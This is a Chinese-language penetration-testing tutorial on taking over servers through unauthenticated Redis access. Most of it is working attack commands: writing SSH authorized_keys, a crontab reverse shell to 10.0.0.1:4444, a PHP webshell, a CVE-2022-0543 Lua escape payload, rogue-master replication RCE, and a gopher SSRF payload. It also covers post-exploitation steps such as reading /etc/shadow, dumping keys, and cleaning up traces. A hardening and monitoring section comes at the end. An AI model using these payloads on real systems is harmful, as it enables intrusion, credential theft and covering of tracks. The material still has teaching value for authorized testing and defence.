---
title: "案例四：Redis未授权访问拿下服务器"
type: docs
weight: 4
---

## 案例四：Redis未授权访问拿下服务器

Redis未授权访问是渗透测试中出现频率最高、危害最大的数据库漏洞之一。攻击者无需任何认证凭证，即可连接Redis实例并执行任意命令，最终通过文件写入能力获取服务器的完全控制权限。本案例从攻击者的视角，完整还原从发现漏洞到拿下服务器的全过程，并深入剖析每一步的技术原理。

### 1 Redis未授权访问的成因

#### 1.1 Redis的默认配置缺陷

Redis在设计之初定位为"仅限内网使用的缓存服务"，因此默认配置极为宽松：

| 配置项 | 默认值 | 安全影响 |
|--------|--------|----------|
| `bind` | `0.0.0.0`（Redis 3.2之前） | 监听所有网络接口，外网可直接连接 |
| `requirepass` | 空（无密码） | 任何人均可执行任意命令 |
| `protected-mode` | `yes`（Redis 3.2+） | 仅在bind和requirepass均为空时生效 |
| `rename-command` | 无（所有命令可用） | CONFIG、FLUSHALL等危险命令可直接调用 |

Redis 3.2引入了protected-mode机制，但其生效条件是bind和requirepass同时为空。许多运维人员只配置了bind但忘记设置密码，导致protected-mode不生效，Redis仍然暴露在内网中。更常见的情况是在Docker容器中运行Redis，Docker默认覆盖bind配置为`0.0.0.0`，而运维人员并未意识到这一点。

#### 1.2 为什么未授权访问能拿服务器

Redis能够拿下服务器的根本原因在于三个能力的组合：

1. **任意文件写入**：通过`CONFIG SET dir`和`CONFIG SET dbfilename`可以将RDB快照写入服务器文件系统的任意路径
2. **可控文件内容**：通过`SET`命令可以设置任意字节序列作为key/value，这些内容会出现在RDB文件中
3. **定时任务执行**：Linux的crontab、SSH的authorized_keys、Web服务器的脚本目录都是可写入且会被系统/服务自动加载的目标

这三者组合起来，攻击者可以向任意位置写入任意内容，从而实现代码执行。

### 2 信息收集与漏洞确认

#### 2.1 端口扫描发现Redis

```bash
# 使用nmap扫描6379端口
nmap -sV -p 6379 --script redis-info 192.168.1.0/24

# 使用masscan进行大范围快速扫描
masscan 10.0.0.0/8 -p 6379 --rate 10000 -oL redis_targets.txt

# 使用shodan进行互联网搜索（合法授权范围内）
# 搜索语法：product:"Redis" port:6379
```

#### 2.2 验证未授权访问

```bash
# 直接连接Redis
redis-cli -h 192.168.1.100

# 执行INFO命令获取服务器详细信息
192.168.1.100:6379> INFO server
# Server
redis_version:6.2.6
os:Linux 5.4.0-91-generic x86_64
tcp_port:6379
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# 查看当前配置
192.168.1.100:6379> CONFIG GET requirepass
1) "requirepass"
2) ""
# 空字符串表示无密码

# 查看数据量
192.168.1.100:6379> DBSIZE
(integer) 3847
```

如果`INFO`命令返回了服务器信息而非`NOAUTH Authentication required`错误，说明存在未授权访问。此时攻击者已获得对Redis的完整控制权。

#### 2.3 环境探测

在正式攻击前，需要收集目标环境信息以选择最优攻击路径：

```bash
# 检测操作系统
192.168.1.100:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
# 路径风格显示这是Linux系统

# 检测Web服务器
192.168.1.100:6379> CONFIG SET dir /var/www/html/
OK
# 如果返回OK，说明存在Web目录且Redis进程有写权限

# 检测SSH目录
192.168.1.100:6379> CONFIG SET dir /root/.ssh/
(error) ERR Changing directory: Permission denied
# 如果权限不足，尝试其他用户
192.168.1.100:6379> CONFIG SET dir /home/ubuntu/.ssh/
OK

# 检测crontab目录
192.168.1.100:6379> CONFIG SET dir /var/spool/cron/crontabs/
OK
# Debian/Ubuntu系统的crontab路径
192.168.1.100:6379> CONFIG SET dir /var/spool/cron/
OK
# CentOS/RHEL系统的crontab路径

# 检测Redis进程运行用户
192.168.1.100:6379> INFO server | grep config_file
config_file:/etc/redis/redis.conf
192.168.1.100:6379> GET /etc/passwd
(nil)
# 尝试通过其他方式获取运行用户
```

也可以直接通过`/proc/self/`读取进程信息：

```bash
# 读取Redis进程的命令行
192.168.1.100:6379> GET /proc/self/cmdline
(nil)
# 注意：GET只能读取Redis的key，不能读取文件系统
# 文件系统信息需要通过CONFIG SET后的写入来间接探测
```

### 3 攻击路径一：写入SSH公钥

这是最可靠的攻击方式，因为SSH登录后获得的是完整的交互式shell。

#### 3.1 原理

SSH支持公钥认证，客户端的公钥存储在服务器用户目录的`~/.ssh/authorized_keys`文件中。如果能向该文件写入攻击者的公钥，就可以免密码SSH登录。

Redis的RDB文件格式有一个关键特性：会在文件头部添加`REDIS`魔数和版本号，在尾部添加校验和，但中间的key-value数据基本以原始字节存储。SSH读取authorized_keys时会忽略无法解析的行，因此RDB文件格式的额外字节不会阻止SSH识别公钥。

#### 3.2 完整攻击流程

```bash
# Step 1: 本地生成SSH密钥对（如果还没有的话）
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""
# 生成 /tmp/redis_rsa（私钥）和 /tmp/redis_rsa.pub（公钥）

# Step 2: 将公钥内容处理为Redis可存储的格式
# 读取公钥并在前后添加换行符（确保公钥独占一行）
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/pubkey.txt

# Step 3: 连接Redis并写入公钥
redis-cli -h 192.168.1.100 flushall
# 清空所有数据，确保RDB文件中只有我们的公钥内容

# 将公钥内容设为一个key的value
cat /tmp/pubkey.txt | redis-cli -h 192.168.1.100 -x SET sshkey
# -x 选项：从stdin读取最后一个参数

# Step 4: 设置RDB文件输出路径
redis-cli -h 192.168.1.100 CONFIG SET dir /root/.ssh/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename authorized_keys

# Step 5: 触发RDB持久化
redis-cli -h 192.168.1.100 SAVE
# 返回OK表示写入成功

# Step 6: SSH连接目标服务器
ssh -i /tmp/redis_rsa root@192.168.1.100
# 成功登录，获得root权限
```

#### 3.3 常见问题排查

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| `CONFIG SET dir /root/.ssh/` 返回Permission denied | Redis进程非root运行 | 尝试`/home/<user>/.ssh/`，先确认用户 |
| SAVE成功但SSH仍然需要密码 | RDB文件中包含额外格式字节 | 检查authorized_keys文件内容，确保公钥在独立行上 |
| `.ssh`目录不存在 | 目标未配置过SSH密钥认证 | 先用crontab或webshell方式创建目录 |
| 目标使用了SSH指纹校验 | 服务器配置了`AuthorizedKeysCommand` | 该方式不可用，改用其他攻击路径 |

### 4 攻击路径二：写入Crontab反弹Shell

当SSH公钥方式不可用时（例如目标不运行SSH服务，或`.ssh`目录不可写），可以通过crontab定时任务反弹shell。

#### 4.1 原理

Linux的crontab定时任务存储在文件中，系统每分钟读取并执行。不同发行版的crontab路径不同：

| 发行版 | Crontab路径 | 格式要求 |
|--------|------------|----------|
| CentOS/RHEL | `/var/spool/cron/` | 用户名即文件名，直接存储cron表达式 |
| Debian/Ubuntu | `/var/spool/cron/crontabs/` | 同上，但目录权限更严格 |
| Alpine（Docker常见） | `/etc/crontabs/` | 同上 |

Redis的RDB文件写入机制与crontab读取机制之间存在一个巧妙的兼容点：crontab在解析定时任务时会忽略无法识别的行，而RDB文件的头部（`REDIS`魔数+版本信息）恰好会被当作无效行忽略，文件尾部的校验和同理。

#### 4.2 完整攻击流程

```bash
# Step 1: 在攻击机上启动监听
nc -lvp 4444

# Step 2: 准备crontab内容
# 格式：\n\n + cron表达式 + 反弹shell命令 + \n\n
# 前后的换行确保cron表达式独占一行

# Step 3: 连接Redis写入crontab
redis-cli -h 192.168.1.100 flushall

# 写入反弹shell的cron任务
redis-cli -h 192.168.1.100 SET payload "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"

# Step 4: 设置crontab路径
# 根据目标发行版选择路径
redis-cli -h 192.168.1.100 CONFIG SET dir /var/spool/cron/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename root

# Step 5: 触发持久化
redis-cli -h 192.168.1.100 SAVE

# Step 6: 等待最多1分钟，反弹shell将到达监听端口
```

#### 4.3 Crontab写入失败的排查

```bash
# Debian/Ubuntu系统可能需要写入crontabs目录
redis-cli -h 192.168.1.100 CONFIG SET dir /var/spool/cron/crontabs/

# 如果提示Permission denied，说明Redis非root运行
# 尝试写入对应用户的crontab
redis-cli -h 192.168.1.100 CONFIG SET dbfilename www-data

# 部分系统中crontab目录权限严格
# 可以尝试通过anacron路径
redis-cli -h 192.168.1.100 CONFIG SET dir /etc/cron.d/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename payload
```

### 5 攻击路径三：写入WebShell

当目标服务器运行Web服务且Redis进程对其Web根目录有写权限时，可以直接写入WebShell获取命令执行能力。此方法在案例七中有详细说明，此处仅列出关键要点。

```bash
# 写入PHP WebShell
redis-cli -h 192.168.1.100 flushall
redis-cli -h 192.168.1.100 SET shell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html/
redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.100 SAVE

# 访问WebShell
curl "http://192.168.1.100/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

不同Web语言和框架的写入路径：

| Web技术 | 常见路径 | 文件名后缀 |
|---------|---------|-----------|
| Apache + PHP | `/var/www/html/` | `.php` |
| Nginx + PHP-FPM | `/usr/share/nginx/html/` | `.php` |
| Tomcat + JSP | `/var/lib/tomcat*/webapps/ROOT/` | `.jsp` |
| Spring Boot | 内嵌服务器，无固定Web目录 | 需通过其他方式 |
| Flask/Django | `/srv/app/`或项目目录 | `.py`不直接执行 |

**注意**：由于RDB文件会在内容前后添加格式字节，直接写入的PHP代码开头可能出现乱码导致语法错误。解决办法是在payload前面添加大量注释来"吸收"RDB头部字节：

```bash
redis-cli -h 192.168.1.100 SET x "<?php // $(python3 -c "print('A'*100)") system(\$_GET['cmd']); ?>"
```

### 6 攻击路径四：Lua脚本沙箱逃逸（Redis 2.x-5.x）

Redis内置Lua解释器用于执行服务端脚本。在Redis 5.0及更早版本中，Lua沙箱存在逃逸漏洞（CVE-2022-0543），攻击者可以通过Lua脚本直接在服务器上执行命令。

#### 6.1 原理

Redis的Lua沙箱通过移除`os`、`io`等标准库来限制脚本能力。但Debian/Ubuntu打包的Redis中，Lua的`package.loadlib`函数未被正确移除，攻击者可以加载系统的Lua动态库，从而恢复`os.execute`等危险函数。

#### 6.2 漏洞利用

```bash
# 连接Redis
redis-cli -h 192.168.1.100

# 通过Lua脚本执行命令（CVE-2022-0543）
 EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res;" 0
# 返回: uid=6379(redis) gid=6379(redis) groups=6379(redis)
```

**注意**：此漏洞仅影响特定发行版的Redis包，不是所有Redis实例都受影响。漏洞编号CVE-2022-0543，影响Debian系的Redis 5.0.13之前版本。

### 7 攻击路径五：Redis主从复制RCE

这是目前最强大的Redis未授权利用方式，不受RDB文件格式干扰，可以直接在目标服务器上加载并执行恶意共享库。

#### 7.1 原理

Redis支持主从复制（Master-Slave Replication），从节点会加载主节点发送的数据。攻击者可以搭建一个恶意Redis服务器作为主节点，让目标Redis成为其从节点，然后通过全量同步（PSYNC）将恶意模块（.so动态库）推送到目标服务器并加载执行。

整个攻击链如下：

```text
攻击者                          目标Redis
  |                                |
  |  1. 启动恶意Redis主节点         |
  |                                |
  |  2. SLAVEOF 攻击者IP 端口  <----|
  |       (目标成为从节点)          |
  |                                |
  |  3. 全量同步，推送.so模块  ---->|
  |                                |
  |  4. MODULE LOAD /tmp/exp.so -->|
  |       (加载恶意模块，执行命令)   |
  |                                |
  |  5. SYSTEM.exec "whoami"  ---->|
  |       (通过自定义命令执行)       |
```

#### 7.2 工具利用

使用`redis-rogue-server`工具自动化整个流程：

```bash
# 克隆工具
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server

# 使用Python脚本执行攻击
python3 redis-rogue-server.py --rhost 192.168.1.100 --lhost 10.0.0.1

# 工具会自动：
# 1. 编译恶意.so模块
# 2. 启动恶意Redis主节点
# 3. 让目标成为从节点
# 4. 同步恶意模块到目标
# 5. 加载模块并提供交互式shell
```

使用`redis-attack`工具：

```bash
git clone https://github.com/r35tart/RedisWriteFile.git
# 该工具更侧重于文件写入，支持多种写入方式
```

使用`RedisEXP`工具：

```bash
git clone https://github.com/yuyan-sec/RedisEXP.git
cd RedisEXP
go build -o redisexp main.go

# 主从复制RCE
./redisexp -rhost 192.168.1.100 -lhost 10.0.0.1 -exec

# 写入WebShell
./redisexp -rhost 192.168.1.100 -webshell /var/www/html/

# 写入SSH公钥
./redisexp -rhost 192.168.1.100 -ssh /tmp/redis_rsa.pub

# 写入crontab
./redisexp -rhost 192.168.1.100 -cron "10.0.0.1" 4444
```

#### 7.3 手动执行主从复制攻击

```bash
# Step 1: 在攻击机上生成恶意模块
# 编写C代码（exploit.c）
cat << 'EOF' > exploit.c
#include <stdlib.h>
#include <string.h>

// Redis模块入口
int RedisModule_OnLoad(void *ctx, void **argv, int argc) {
    // 注册一个SYSTEM命令
    // 实际的模块代码需要使用Redis Module API
    return 0;
}
EOF

# 使用更成熟的方案：直接使用现成的.so文件
# 从redis-rogue-server项目中获取

# Step 2: 启动恶意Redis服务
# 需要自定义一个Redis服务器，在收到PSYNC请求时发送恶意.so文件
# 建议直接使用工具，手动实现较为复杂

# Step 3: 让目标Redis成为从节点
redis-cli -h 192.168.1.100 SLAVEOF 10.0.0.1 6379

# Step 4: 等待同步完成后加载模块
redis-cli -h 192.168.1.100 MODULE LOAD /tmp/exp.so

# Step 5: 通过模块提供的自定义命令执行系统命令
redis-cli -h 192.168.1.100 system.exec "id"
redis-cli -h 192.168.1.100 system.exec "cat /etc/shadow"

# Step 6: 清理痕迹
redis-cli -h 192.168.1.100 MODULE UNLOAD system
redis-cli -h 192.168.1.100 SLAVEOF NO ONE
redis-cli -h 192.168.1.100 config set dir /var/lib/redis
```

### 8 攻击路径六：利用Redis扩展命令（SSRF联动）

在某些场景中，Redis服务不直接暴露在公网上，但应用层存在SSRF漏洞，攻击者可以通过SSRF向Redis发送命令。

#### 8.1 CRLF注入发送Redis命令

如果目标Web应用存在CRLF注入漏洞，可以通过HTTP请求向内网Redis发送命令：

```bash
# 通过CRLF注入在HTTP请求中嵌入Redis命令
# 注意：需要URL编码\r\n（%0D%0A）
curl "http://victim.com/page?url=http://127.0.0.1:6379/%0D%0ASET%20pwned%20true%0D%0A"

# 更复杂的利用：通过gopher协议直接发送Redis命令
# gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$28%0D%0A%0A%0A<%3Fphp%20system($_GET%5B'cmd'%5D)%3B%3F>%0A%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A
```

#### 8.2 使用Gopherus工具自动生成payload

```bash
# 安装Gopherus
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus

# 生成Redis写入WebShell的gopher payload
python3 gopherus.py --exploit redis

# 按提示输入WebShell路径和内容
# 工具会生成可直接用于SSRF的gopher:// URL
```

### 9 后渗透：获取Shell后的操作

成功获取服务器访问权限后，进行以下后渗透操作：

#### 9.1 权限提升检查

```bash
# 检查当前用户和权限
id
whoami

# 查看系统信息
uname -a
cat /etc/os-release

# 检查SUID文件
find / -perm -4000 -type f 2>/dev/null

# 检查sudo权限
sudo -l

# 检查内核版本是否存在提权漏洞
# Linux 5.4-5.6.1: DirtyPipe (CVE-2022-0847)
# Linux 4.4-4.13: DirtyCow (CVE-2016-5195)
```

#### 9.2 横向移动

```bash
# 查看网络连接和邻居
ip addr
ss -tlnp
arp -a

# 检查Redis中的敏感数据
redis-cli -h 192.168.1.100 KEYS "*session*"
redis-cli -h 192.168.1.100 KEYS "*token*"
redis-cli -h 192.168.1.100 KEYS "*password*"

# 导出所有key
redis-cli -h 192.168.1.100 --scan --pattern "*" | while read key; do
    echo "=== $key ==="
    redis-cli -h 192.168.1.100 GET "$key" 2>/dev/null
done
```

#### 9.3 痕迹清理

```bash
# 恢复Redis原始配置
redis-cli -h 192.168.1.100 CONFIG SET dir /var/lib/redis
redis-cli -h 192.168.1.100 CONFIG SET dbfilename dump.rdb
redis-cli -h 192.168.1.100 SLAVEOF NO ONE

# 删除写入的文件
rm -f /root/.ssh/authorized_keys
rm -f /var/www/html/shell.php

# 清除crontab中的恶意任务
# 注意：需要先备份原始crontab内容

# 查看Redis日志位置
redis-cli -h 192.168.1.100 CONFIG GET logfile
```

### 10 自动化工具对比

| 工具名称 | 语言 | 支持功能 | 特点 |
|----------|------|---------|------|
| redis-rogue-server | Python | 主从复制RCE | 最早的主从复制利用工具 |
| RedisEXP | Go | SSH/WebShell/Crontab/主从复制RCE | 功能全面，编译为单一二进制 |
| redis-attack | Python | 文件写入、多种payload | 轻量级，专注于文件写入 |
| Gopherus | Python | 生成gopher:// SSRF payload | 针对SSRF场景 |
| RedisWriteFile | Python | 多种文件写入方式 | 专注于写入，支持自定义payload |
| Metasploit | Ruby | `auxiliary/scanner/redis/redis_server` | 集成在MSF中，支持扫描和利用 |

### 11 防御与加固

#### 11.1 紧急加固措施

如果发现Redis存在未授权访问，应立即执行以下加固：

```bash
# 1. 设置强密码
redis-cli CONFIG SET requirepass "$(openssl rand -base64 32)"
# 同时修改配置文件使其永久生效
echo 'requirepass YourStrongPassword123!' >> /etc/redis/redis.conf

# 2. 绑定内网IP
echo 'bind 127.0.0.1 10.0.0.5' >> /etc/redis/redis.conf

# 3. 启用保护模式
echo 'protected-mode yes' >> /etc/redis/redis.conf

# 4. 禁用危险命令
echo 'rename-command CONFIG ""' >> /etc/redis/redis.conf
echo 'rename-command FLUSHALL ""' >> /etc/redis/redis.conf
echo 'rename-command FLUSHDB ""' >> /etc/redis/redis.conf
echo 'rename-command DEBUG ""' >> /etc/redis/redis.conf

# 5. 重启Redis使配置生效
systemctl restart redis
```

#### 11.2 深度防御方案

```bash
# 使用低权限用户运行Redis
useradd -r -s /bin/false redis
chown -R redis:redis /var/lib/redis
# systemd service文件中设置User=redis

# 配置文件权限
chmod 600 /etc/redis/redis.conf
chown redis:redis /etc/redis/redis.conf

# 限制Redis可写目录
echo 'dir /var/lib/redis' >> /etc/redis/redis.conf
echo 'dbfilename dump.rdb' >> /etc/redis/redis.conf

# 使用ACL精细控制权限（Redis 6.0+）
# 创建受限用户
redis-cli ACL SETUSER appuser on >app_password ~* +get +set +del -@dangerous

# 配置防火墙，仅允许可信IP访问6379
iptables -A INPUT -p tcp --dport 6379 -s 10.0.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP
```

#### 11.3 监控与告警

```bash
# 监控Redis连接来源
redis-cli CLIENT LIST

# 监控CONFIG SET操作（通过Redis的事件通知机制）
# 在redis.conf中启用命令审计日志
# 或使用第三方工具如redis-faina进行命令分析

# 使用fail2ban监控异常Redis连接
cat << 'EOF' > /etc/fail2ban/filter.d/redis-auth.conf
[Definition]
failregex = ^.*Authentication required$
ignoreregex =
EOF
```

### 12 真实案例与数据

#### 12.1 大规模Redis入侵事件

2015-2016年间，互联网上出现了大规模的Redis未授权访问事件。攻击者扫描开放的Redis实例，写入SSH公钥后批量控制服务器，组建僵尸网络用于DDoS攻击。据Censys统计，高峰期互联网上暴露的无密码Redis实例超过5万个。

2020年，多个云厂商的容器化Redis实例因Docker默认配置问题被批量入侵。攻击者利用Redis主从复制加载恶意模块，在容器内植入挖矿程序。

#### 12.2 攻击面统计

根据实际渗透测试经验，Redis未授权访问的利用成功率与以下因素相关：

| 因素 | 成功率影响 |
|------|-----------|
| Redis以root运行 | SSH公钥方式成功率接近100% |
| Redis以redis用户运行 | SSH方式失败，但crontab方式仍可能成功 |
| 存在Web服务且目录可写 | WebShell方式成功率约80% |
| Redis 6.0+且已设置ACL | 几乎无法利用 |
| 运行在Docker容器中 | 文件写入受限，但主从复制仍有效 |

### 13 总结

Redis未授权访问是目前最危险的数据库漏洞之一。其根本原因在于Redis默认配置缺乏安全防护，加上Redis强大的文件写入能力，使得攻击者可以在大多数场景下直接获取服务器控制权限。

关键要点：

1. **优先使用SSH公钥方式**：最可靠，获得的是完整交互式shell
2. **主从复制是终极方案**：不受RDB格式干扰，可直接执行命令，适用于Redis 4.x-5.x
3. **Crontab是兜底方案**：适用于无法写入SSH目录的场景，但需要等待定时任务触发
4. **防御必须纵深**：单一措施（如仅设密码）不够，需要绑定IP、禁用命令、低权限运行、网络隔离等多重防护
